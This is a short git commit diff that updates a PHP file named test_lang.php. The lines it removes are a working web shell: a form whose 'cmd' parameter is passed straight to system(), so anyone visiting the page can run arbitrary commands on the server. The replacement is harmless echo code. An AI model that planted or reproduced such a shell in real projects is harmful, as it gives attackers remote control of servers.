1fc06e587c2440ac5a131230d1176d0b996f07d7
Supawee Foitong <54932124+madamgoodzy61@users.noreply.github.com>
2023-08-08 15:17:41 +0700

    Update test_lang.php

--- test_lang.php
+++ test_lang.php
@@ -1,15 +1,6 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+   
+echo '<?php echo $_SERVER["SERVER_NAME"]; ?>';
+
 ?>
-</pre>
-</body>
+
